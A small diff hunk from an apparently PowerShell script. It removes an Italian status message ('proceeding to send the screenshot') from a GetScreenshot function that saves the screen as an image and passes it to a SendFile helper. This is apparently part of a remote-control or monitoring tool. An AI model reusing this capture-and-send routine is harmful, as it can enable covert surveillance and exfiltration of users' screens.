@@ -47,7 +47,6 @@ function GetScreenshot {
         $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
         $bitmap.Dispose()
         $graphics.Dispose()
-        SendMessage "Procedo ad inviare lo screenshot..."
         SendFile $outputPath
     }
     catch {
